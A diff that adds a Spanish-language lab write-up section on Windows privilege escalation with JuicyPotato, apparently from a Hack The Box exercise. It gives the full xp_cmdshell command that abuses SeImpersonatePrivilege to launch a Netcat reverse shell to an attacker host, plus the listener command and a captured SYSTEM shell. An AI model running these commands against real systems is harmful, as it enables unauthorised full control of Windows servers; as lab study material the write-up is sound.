@@ -187,3 +187,90 @@ Este es un indicador claro de una posible escalada de privilegios, ya que [**Jui
 `Nota`: `**DCOM/NTLM reflection abuse**`: El atacante “engaña” al sistema para que se autentique contra sí mismo y reutiliza (refleja) esa autenticación NTLM para obtener un token con privilegios más altos.
 
 ---
+
+
+### Escalada de privilegios usando JuicyPotato
+
+
+En este paso se aprovechan los privilegios `SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege` para escalar privilegios al nivel de **NT AUTHORITY\SYSTEM** utilizando la herramienta **JuicyPotato.exe**.
+
+El procedimiento consiste en ejecutar JuicyPotato desde el contexto de la cuenta de servicio que posee dichos privilegios, forzando la suplantación de un token de sistema mediante el abuso del mecanismo de **reflexión DCOM/NTLM**.
+
+---
+
+**Procedimiento general**
+
+1. Descargar los binarios necesarios:
+
+   * `JuicyPotato.exe` (herramienta de explotación)
+   * `nc.exe` (Netcat, para obtener una shell inversa)
+
+2. Subir ambos archivos al servidor objetivo en una carpeta accesible, por ejemplo:
+   `C:\tools\\JuicyPotato.exe` y `C:\tools\\nc.exe`
+
+3. En el equipo atacante, iniciar un listener con Netcat en el puerto **8443**:
+
+   ```
+   nc -lnvp 8443
+   ```
+
+4. Desde la sesión SQL, ejecutar el siguiente comando mediante `xp_cmdshell`:
+
+   ```
+   SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
+   ```
+
+   Donde:
+
+   * **-l** → Puerto del servidor COM que escucha (53375 en este caso).
+   * **-p** → Programa a ejecutar (cmd.exe).
+   * **-a** → Argumento pasado al programa (en este caso, la conexión reversa con Netcat).
+   * **-t** → Indica los métodos de creación de proceso a probar:
+
+     * `CreateProcessWithTokenW` (requiere `SeImpersonatePrivilege`)
+     * `CreateProcessAsUser` (requiere `SeAssignPrimaryTokenPrivilege`)
+
+---
+
+**Salida esperada**
+
+```
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375
+[+] authresult 0
+{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
+[+] CreateProcessWithTokenW OK
+[+] calling 0x000000000088ce08
+```
+
+Esto indica que la explotación fue exitosa y que se logró crear un proceso bajo el contexto de **NT AUTHORITY\SYSTEM**.
+
+---
+
+**Catching SYSTEM Shell**
+
+En el listener del atacante se recibe la conexión inversa:
+
+```
+CyberWolfSec@htb[/htb]$ sudo nc -lnvp 8443
+
+listening on [any] 8443 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32>hostname
+WINLPE-SRV01
+```
+
+El comando `whoami` confirma la obtención de una shell con **privilegios de SYSTEM**, completando así la escalada de privilegios.
+
+---
+
+**Conclusión**
+
+* JuicyPotato explota la reflexión DCOM/NTLM para obtener un token privilegiado.
+* La cuenta con `SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege` puede suplantar al usuario SYSTEM.
+* La explotación culmina con la obtención de una shell remota con privilegios máximos en el sistema comprometido.
